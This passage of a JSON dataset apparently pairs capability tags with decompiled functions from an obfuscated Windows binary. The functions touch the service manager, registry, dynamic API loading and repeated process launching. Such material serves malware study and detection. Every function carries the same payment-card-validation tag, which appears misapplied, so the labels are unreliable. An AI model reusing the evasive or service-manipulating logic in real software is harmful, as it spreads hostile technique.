            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004029e0(uint param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_wcslen)(param_1);\n    (*_sym.imp.KERNEL32.dll_WideCharToMultiByte)(0, 0, param_1, iVar1 + 1, param_2, param_3, 0, 0);\n    return;\n}\n",
        "token_count": 103
    },
    "00402be0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402c61) overlaps instruction at (ram,0x00402c60)\n// \n// WARNING: Removing unreachable block (ram,0x00402c61)\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00402be0(int32_t *arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint *in_FS_OFFSET;\n    char cVar8;\n    char cVar9;\n    uint var_24ch;\n    uchar var_148h;\n    uint var_147h;\n    uint *var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t pbstr;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint var_28h;\n    int32_t *var_24h;\n    int32_t *var_20h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t *var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    uint uStack12;\n    int32_t var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x405090;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    (*_sym.imp.ole32.dll_CoInitialize)(0);\n    puVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x424854);\n    cVar9 = '\\0';\n    cVar8 = puVar1 < 0;\n    if (puVar1 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_44h = puVar1;\n    uVar2 = (*_sym.imp.USER32.dll_RegisterWindowMessageA)(0x424860);\n    puVar7 = puVar1;\n    if ((cVar9 == cVar8) && (cVar9 != cVar8)) {\n        out(0xc4, uVar2);\n        puVar7 = puVar1 + 1;\n        *puVar1 = uVar2;\n    }\n    (*_sym.imp.USER32.dll_SendMessageTimeoutA)(arg_8h, uVar2, 0, 0, 2, 1000, &var_18h);\n    pcVar3 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(puVar7, 0x424874);\n    if (pcVar3 == NULL) {\n        *in_FS_OFFSET = var_ch;\n        return 1;\n    }\n    var_20h = NULL;\n    var_4h = 0;\n    iVar4 = (*pcVar3)(var_18h, str._D_3, 0, &var_20h);\n    if ((iVar4 < 0) || (var_20h == NULL)) {\n        var_4h = 0xffffffff;\n        if (var_20h != NULL) {\n            (**(*var_20h + 8))(var_20h);\n        }\n    }\n    else {\n        var_24h = NULL;\n        var_4h._0_1_ = 1;\n        iVar4 = (**(*var_20h + 0x20))(var_20h, &var_24h);\n        if ((iVar4 < 0) || (var_24h == NULL)) {\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n            }\n        }\n        else {\n            var_1ch = 0;\n            (**(*var_24h + 0x24))(var_24h, &var_1ch);\n            var_40h = 0;\n            if (0 < var_1ch) {\n                do {\n                    var_2ch = (*_sym.imp.MSVCRT.dll_rand)();\n                    var_2ch = var_2ch % var_1ch;\n                    var_34h = CONCAT22(var_34h._2_2_, 3);\n                    arg_8h = NULL;\n                    var_10h = NULL;\n                    var_4h._0_1_ = 4;\n                    iVar4 = (**(*var_24h + 0x2c))\n                                      (var_24h, var_34h, var_30h, var_2ch, var_28h, var_34h, var_30h, var_2ch, var_28h, \n                                       &arg_8h);\n                    if ((iVar4 < 0) || (arg_8h == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x00403017:\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\ncode_r0x00403023:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar4 = (***arg_8h)(arg_8h, 0x4061b0, &var_10h);\n                    if (((iVar4 < 0) || (var_10h == NULL)) ||\n                       (iVar4 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar4 < 0)) {\njoined_r0x00402fde:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                        goto code_r0x00403023;\n                    }\n                    if (pbstr == 0) {\njoined_r0x00402e1a:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                    }\n                    else {\n                        fcn.004029e0(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar5 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x424888);\n                        if (iVar5 != 0) goto joined_r0x00402e1a;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar4 = (***arg_8h)(arg_8h, 0x4061a0, &var_14h);\n                        if ((iVar4 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x00402fc3:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x00403017;\n                        }\n                        iVar4 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar5 = var_3ch;\n                        if (iVar4 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x00402fc3;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar1 = &var_147h;\n                            for (iVar6 = 0x40; iVar6 != 0; iVar6 = iVar6 + -1) {\n                                *puVar1 = 0;\n                                puVar1 = puVar1 + 1;\n                            }\n                            *puVar1 = 0;\n                            *(puVar1 + 2) = 0;\n                            fcn.004029e0(iVar5, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar5 = fcn.00402b10(&var_148h);\n                            if (iVar5 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x00402fde;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (arg_8h != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*arg_8h + 8))(arg_8h);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            puVar7 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                puVar7 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(puVar7);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar4;\n}\n",
        "token_count": 2651
    },
    "00403250": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403271) overlaps instruction at (ram,0x0040326d)\n// \n// WARNING: Type propagation algorithm not settling\n\nvoid __fastcall fcn.00403250(uint param_1, int32_t *param_2)\n\n{\n    code *pcVar1;\n    uint8_t *puVar2;\n    uint8_t uVar6;\n    int32_t in_EAX;\n    char **ppcVar3;\n    char *pcVar4;\n    char **ppcVar5;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    int32_t iVar7;\n    char extraout_DH;\n    char extraout_DH_00;\n    uint extraout_EDX;\n    char *unaff_EBX;\n    uchar *unaff_EBP;\n    uchar *puVar8;\n    uchar *puVar9;\n    char **unaff_ESI;\n    char **unaff_EDI;\n    uint *puVar10;\n    bool bVar11;\n    char cVar12;\n    bool bVar13;\n    char cVar14;\n    unkbyte10 in_ST0;\n    ulong uVar15;\n    uchar lpszPath;\n    uint var_25fh;\n    uint var_15bh;\n    uint *puStack104;\n    char **ppcStack100;\n    uchar *puStack96;\n    uchar *var_58h;\n    char *pcStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    code *pcStack64;\n    uint uStack60;\n    char *pcStack56;\n    uchar *puStack52;\n    char *var_2ch;\n    char *var_28h;\n    char *pcStack40;\n    char *pcStack36;\n    char *pcStack32;\n    char *pcStack28;\n    char *var_14h;\n    uchar *hProcess;\n    char *var_ch;\n    uchar *lParam;\n    uint var_4h;\n    \n    puVar8 = &stack0xfffffffc;\n    puVar9 = &stack0xfffffffc;\n    cVar14 = SBORROW4(&stack0xfffffffc, 0x260);\n    cVar12 = &stack0xfffffd9c < 0;\n    if ((0x25f < &stack0xfffffffc) && (cVar14 != cVar12)) {\n        *(in_EAX + -0x7ce92414) = in_ST0;\n        *param_2 = *param_2 + 0x2ae8df84;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    ppcVar3 = fcn.004025a0();\n    if ((cVar14 == cVar12) && (cVar14 != cVar12)) {\n        unaff_EBX = unaff_EBX ^ 0xff00;\n        *unaff_ESI = *unaff_ESI + unaff_ESI;\n        *unaff_EDI = *unaff_EDI + extraout_ECX;\n        *unaff_EDI = extraout_ECX;\n        *unaff_ESI = *unaff_ESI + unaff_ESI;\n        pcVar1 = ppcVar3 + -0x79;\n        uVar6 = unaff_ESI >> 8;\n        bVar11 = CARRY1(*pcVar1, uVar6);\n        *pcVar1 = *pcVar1 + uVar6;\n        bVar13 = *pcVar1 < '\\0';\n        ppcVar5 = unaff_ESI;\n        iVar7 = extraout_ECX;\n        puVar8 = unaff_EBP;\n        unaff_ESI = ppcVar3;\n        cVar12 = extraout_DH;\ncode_r0x004032a1:\n        puVar9 = puVar8;\n        if (bVar13) goto code_r0x004032ab;\n    }\n    else {\n        ppcVar5 = fcn.00402a10();\n        bVar11 = false;\n        bVar13 = ppcVar5 < 0;\n        if (ppcVar5 == NULL) {\n            return;\n        }\n        iVar7 = extraout_ECX_00;\n        cVar12 = extraout_DH_00;\n        if (!bVar13) goto code_r0x004032a1;\n    }\n    unaff_EBX = NULL;\n    iVar7 = 0x40;\n    bVar11 = false;\n    ppcVar5 = NULL;\n    unaff_EDI = puVar9 + -0x25f;\ncode_r0x004032ab:\n    pcVar4 = ppcVar5 + bVar11 + 0xb9db3330;\n    *pcVar4 = *pcVar4 + pcVar4;\n    *unaff_EBX = *unaff_EBX + cVar12;\n    puVar2 = puVar9 + -0x25e43;\n    *puVar2 = *puVar2 >> 7 | *puVar2 << 1;\n    puVar9[-0x260] = unaff_EBX;\n    for (; iVar7 != 0; iVar7 = iVar7 + -1) {\n        *unaff_EDI = pcVar4;\n        unaff_EDI = unaff_EDI + 1;\n    }\n    *unaff_EDI = pcVar4;\n    var_14h = unaff_EDI + 3;\n    *(unaff_EDI + 2) = pcVar4;\n    lParam = puVar9 + -0x260;\n    var_4h = 0x26;\n    hProcess = 0x4032d8;\n    var_ch = unaff_EBX;\n    iVar7 = (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n    if (iVar7 != 0) {\n        hProcess = 0x403306;\n        fcn.00402820();\n        puVar9[-0x15c] = unaff_EBX;\n        puVar10 = puVar9 + -0x15b;\n        for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n            *puVar10 = 0;\n            puVar10 = puVar10 + 1;\n        }\n        *puVar10 = 0;\n        *(puVar10 + 2) = 0;\n        hProcess = 0x3;\n        pcStack28 = puVar9 + -0x260;\n        var_14h = 0x4247e8;\n        pcStack36 = puVar9 + -0x15c;\n        pcStack32 = 0x424808;\n        pcStack40 = 0x403352;\n        (*_sym.imp.MSVCRT.dll_sprintf)();\n        *(puVar9 + -0x14) = unaff_EBX;\n        while( true ) {\n            puVar10 = puVar9 + -0x58;\n            for (iVar7 = 0x11; iVar7 != 0; iVar7 = iVar7 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            *(puVar9 + -0x10) = 0;\n            *(puVar9 + -0x58) = 0x44;\n            *(puVar9 + -0xc) = 0;\n            *(puVar9 + -0x2c) = 1;\n            *(puVar9 + -8) = 0;\n            *(puVar9 + -0x28) = unaff_EBX;\n            *(puVar9 + -4) = 0;\n            hProcess = puVar9 + -0x10;\n            var_14h = puVar9 + -0x58;\n            puStack52 = puVar9 + -0x15c;\n            uStack60 = 0x4033ac;\n            pcStack56 = unaff_EBX;\n            var_2ch = unaff_EBX;\n            var_28h = unaff_EBX;\n            pcStack40 = unaff_EBX;\n            pcStack36 = unaff_EBX;\n            pcStack32 = unaff_EBX;\n            pcStack28 = unaff_EBX;\n            iVar7 = (*_sym.imp.KERNEL32.dll_CreateProcessA)();\n            if (iVar7 == 0) break;\n            if ((iVar7 < 0) || (iVar7 >= 0)) {\n                uStack60 = 3000;\n                pcStack64 = 0x4033ca;\n                (*_sym.imp.KERNEL32.dll_Sleep)();\n            }\n            else {\n                unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11((unaff_EBX >> 8) * '\\x02', unaff_EBX);\n            }\n            uStack60 = *(puVar9 + -8);\n            pcStack64 = fcn.00403130;\n            uStack68 = 0x4033d9;\n            (*_sym.imp.USER32.dll_EnumWindows)();\n            uStack72 = *(puVar9 + -0x10);\n            uStack68 = 1000;\n            uStack76 = 0x4033f4;\n            uVar15 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)();\n            uStack84 = uVar15 >> 0x20;\n            if (uVar15 == 0x102) {\n                uStack80 = *(puVar9 + -0x10);\n                uStack76 = 1;\n                uStack84 = 0x403407;\n                (*_sym.imp.KERNEL32.dll_TerminateProcess)();\n                uStack84 = extraout_EDX;\n            }\n            ppcVar3 = _sym.imp.KERNEL32.dll_CloseHandle;\n            var_58h = &stack0xffffffb8;\n            uStack76 = *(puVar9 + -0xc);\n            uStack80 = 0x403421;\n            puStack104 = puVar10;\n            ppcStack100 = unaff_ESI;\n            puStack96 = puVar9;\n            pcStack88 = unaff_EBX;\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            uStack80 = *(puVar9 + -0x10);\n            uStack84 = 0x403427;\n            (*ppcVar3)();\n            iVar7 = *(puVar9 + -0x14);\n            *(puVar9 + -0x14) = iVar7 + 1;\n            if (0 < iVar7 + 1) {\n                return;\n            }\n            unaff_EBX = NULL;\n            unaff_ESI = ppcVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 2350
    },
    "004034f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004034f0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n    return iVar1 % 5 + 3;\n}\n",
        "token_count": 49
    },
    "00403520": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040356b) overlaps instruction at (ram,0x00403568)\n// \n\nuint __cdecl fcn.00403520(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t *puVar1;\n    uint arg_8h_00;\n    ushort extraout_CX;\n    uint8_t extraout_DL;\n    int16_t unaff_BX;\n    uint16_t unaff_DI;\n    ushort in_SS;\n    bool bVar2;\n    ushort uVar3;\n    uint uVar4;\n    \n    bVar2 = (unaff_DI | 0x2fff) - unaff_BX == 0x7174;\n    uVar4 = 0;\n    arg_8h_00 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0, 0, 0xf003f);\n    if ((bVar2) || (uVar3 = extraout_CX,  !bVar2)) {\n        uVar3 = arg_8h >> 0x10;\n    }\n    puVar1 = CONCAT22(uVar3, in_SS) + 0x56;\n    *puVar1 = *puVar1 | extraout_DL;\n    fcn.004037b0(0x47, uVar4);\n    uVar4 = fcn.004035b0(arg_8h_00, CONCAT22(uVar3, in_SS), arg_ch);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(arg_8h_00);\n    return uVar4;\n}\n",
        "token_count": 346
    },
    "00403810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040382c) overlaps instruction at (ram,0x00403829)\n// \n\nuint __cdecl fcn.00403810(uint arg_8h)\n\n{\n    uint hSCManager;\n    uint uVar1;\n    char *in_EDX;\n    char *unaff_EDI;\n    \n    *unaff_EDI = *unaff_EDI + '!';\n    *in_EDX = *in_EDX + ']';\n    hSCManager = (*_sym.imp.ADVAPI32.dll_OpenSCManagerA)(0);\n    uVar1 = fcn.00402940(hSCManager, arg_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(hSCManager);\n    return uVar1;\n}\n",
        "token_count": 168
    },
    "004038a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004038fd) overlaps instruction at (ram,0x004038f8)\n// \n// WARNING: Removing unreachable block (ram,0x004038e8)\n// WARNING: Removing unreachable block (ram,0x004038fd)\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004038a0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint8_t extraout_DH;\n    uint unaff_EBX;\n    uint *puVar2;\n    bool bVar3;\n    bool bVar4;\n    uchar lpBuffer;\n    uint var_20fh;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    var_10ch._0_1_ = 0;\n    puVar2 = &var_20fh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    puVar2 = &var_10ch + 1;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    // WARNING: Could not recover jumptable at 0x004038fd. Too many branches\n    // WARNING: Treating indirect jump as call\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_10ch, str.M_2._OF, &lpBuffer, arg_8h);\n    fcn.00403cf0(&var_4h, &var_8h);\n    bVar3 = unaff_EBX >> 8 < extraout_DH;\n    bVar4 = puVar2 == -2;\n    fcn.004039d0(var_4h);\n    if ((!bVar3 && !bVar4) && (bVar3 || bVar4)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    iVar1 = fcn.00401410(&var_10ch, var_4h, var_8h);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    fcn.00403e90(&var_10ch, 0xffffffff);\n    return 1;\n}\n",
        "token_count": 618
    },
    "00403cf0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403cf0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403d80(&var_68h, &var_4h);\n    fcn.00401860(&var_68h, var_4h, 0x411454, 0x13000);\n    *arg_8h = 0x411454;\n    *arg_ch = 0x13000;\n    return;\n}\n",
        "token_count": 239
    },
    "00403d80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403d90) overlaps instruction at (ram,0x00403d8e)\n// \n\nvoid __fastcall fcn.00403d80(uint param_1, uint32_t param_2, uchar *param_3)\n\n{\n    uint32_t uVar1;\n    uint16_t in_AX;\n    uint32_t uVar2;\n    uint8_t uVar3;\n    int32_t unaff_EBX;\n    uchar *puVar4;\n    int32_t unaff_ESI;\n    int32_t iVar5;\n    int32_t *unaff_EDI;\n    bool bVar6;\n    bool bVar7;\n    uint16_t uStack20;\n    \n    puVar4 = &stack0xfffffffc;\n    *param_3 = 0x5f;\n    uStack20 = in_AX;\n    do {\n        uVar1 = uStack20;\n        param_3[1] = 0x18;\n        uStack20 = unaff_EBX;\n        uVar3 = param_2;\n        bVar7 = (param_2 & 0x66) != 0;\n        bVar6 = (POPCOUNT(uVar3 & 0x66) & 1U) == 0;\n        param_3[2] = 99;\n        uVar2 = uVar1;\n        if ((bVar7) && (!bVar7)) {\n            uVar2 = uVar1 & 0xe2f4cc58;\n            bVar6 = (POPCOUNT(uVar1 & 0x58) & 1U) == 0;\n        }\n        bVar7 = false;\n        param_3[3] = 0x4b;\n        if (bVar6) {\ncode_r0x00403df1:\n            param_3[4] = 0xa7;\n            iVar5 = unaff_ESI;\n        }\n        else {\n            uStack20 = unaff_EDI;\n            if (!bVar6) goto code_r0x00403df1;\n            puVar4 = *0xc617b43a;\n            param_3 = param_3 + 1;\n            bVar7 = SCARRY1(uVar3 + 1, -0x59);\n            bVar6 = (POPCOUNT(uVar3 + 0xa8) & 1U) == 0;\n            param_2 = uVar2;\n            iVar5 = 0x34a96cf4;\n        }\n        if ((bVar6) || (!bVar6)) goto code_r0x00403e14;\n        unaff_ESI = *unaff_EDI;\n        *unaff_EDI = iVar5;\n        puVar4 = puVar4 + -*(puVar4 + 0x5f9dff63);\n        if (-1 < puVar4) {\n            bVar7 = false;\n            if (unaff_ESI < 0) {\ncode_r0x00403e14:\n                param_3[5] = 9;\n                if (!bVar7) {\n                    if (bVar7) {\n                        LOCK();\n                    }\n                }\n                param_3[6] = 0x75;\n                param_3[7] = 0xa8;\n                param_3[8] = 0x1c;\n            }\n            param_3[9] = 0x48;\n            **(puVar4 + 0xc) = 10;\n            return;\n        }\n        param_2 = param_2 & 0xff;\n        unaff_EDI[0x14] = unaff_EDI[0x14] + unaff_EBX;\n    } while( true );\n}\n",
        "token_count": 807
    },
    "00403ff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00404055) overlaps instruction at (ram,0x00404051)\n// \n// WARNING: Removing unreachable block (ram,0x0040401b)\n\nuint * __thiscall\nfcn.00403ff0(int32_t param_1, uint param_2, uint param_3, uint32_t param_4, uint param_5, uint param_6, uint param_7)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uchar in_AL;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uint32_t unaff_EBX;\n    uchar *puVar4;\n    uint *puVar5;\n    uint *unaff_EDI;\n    uchar *puVar6;\n    bool bVar7;\n    char in_SF;\n    char in_OF;\n    ulong uVar8;\n    uchar auStack256 [188];\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint32_t uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    puVar4 = &stack0xfffffffc;\n    puVar5 = 0x1;\n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        puVar5 = NULL;\n        puVar6 = unaff_EDI | &stack0xfffffffc;\n        unaff_EDI = puVar6 + 1;\n        *puVar6 = in_AL;\n    }\n    uStack32 = param_3;\n    uStack24 = 0xf003f;\n    uStack28 = 0;\n    uStack36 = param_2;\n    uStack40 = 0x40402f;\n    uVar8 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)();\n    bVar7 = uVar8 != 0;\n    if (bVar7) {\n        return NULL;\n    }\n    if (bVar7) {\n        if (!bVar7) {\n            *unaff_EDI = *puVar5;\n            param_4 = &stack0xffffff00 | 0x51;\n            puVar1 = (unaff_EBX & 0xffff0000 | CONCAT11(0xdf, unaff_EBX)) + 0x8b501455;\n            uVar2 = *puVar1;\n            *puVar1 = *puVar1 - extraout_ECX;\n            *(extraout_ECX + -0x75) = *(extraout_ECX + -0x75) + (uVar8 >> 0x20) + (uVar2 < extraout_ECX);\n            puVar4 = 0x8be181d0;\n            param_1 = extraout_ECX;\n            param_5 = uVar8 >> 0x20;\n            puVar5 = puVar5 + 1;\n            goto code_r0x00404066;\n        }\n    }\n    uStack40 = param_7;\n    uStack44 = param_6;\ncode_r0x00404066:\n    uStack52 = 0;\n    uStack64 = 0x404071;\n    iStack60 = param_1;\n    uStack56 = param_4;\n    uStack48 = param_5;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)();\n    if (iVar3 != 0) {\n        puVar5 = NULL;\n    }\n    uStack64 = *(puVar4 + -4);\n    uStack68 = 0x40408d;\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n    return puVar5;\n}\n",
        "token_count": 834
    },
    "004040a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040411d) overlaps instruction at (ram,0x0040411c)\n// \n\nvoid __cdecl fcn.004040a0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uchar uVar1;\n    ushort extraout_DX;\n    uint32_t unaff_ESI;\n    uint32_t uVar2;\n    uchar *unaff_EDI;\n    uint8_t uVar3;\n    uchar uVar4;\n    uint8_t uVar5;\n    \n    if (arg_ch == 1) {\n        fcn.00401c40();\n        uVar2 = unaff_ESI & 0xffff0000 | unaff_ESI + 1;\n        uVar3 = uVar2 < 0x222c;\n        uVar5 = SBORROW4(uVar2, 0x222c);\n        uVar4 = uVar2 == 0x222c;\n        fcn.00401120();\n        if ((!uVar4) && (uVar4)) {\n            uVar5 = ((uVar5 & 1) * 0x800 & 0x800) != 0;\n            uVar4 = ((uVar4 & 1) * '@' & 0x40) != 0;\n            uVar3 = (uVar3 & 1) != 0;\n        }\n        fcn.00403250();\n        if ((uVar5) || (!uVar5)) {\n            if (*0x424928 != 0) goto code_r0x00404133;\n            (*_sym.imp.USER32.dll_PostQuitMessage)();\n        }\n        else {\n            uVar1 = in(extraout_DX);\n            *unaff_EDI = uVar1;\n            if (!uVar3 && !uVar4) {\n                return;\n            }\n        }\n        fcn.00404a40();\n    }\ncode_r0x00404133:\n    (*_sym.imp.USER32.dll_DefWindowProcA)();\n    return;\n}\n",
        "token_count": 449
    },
    "00404740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
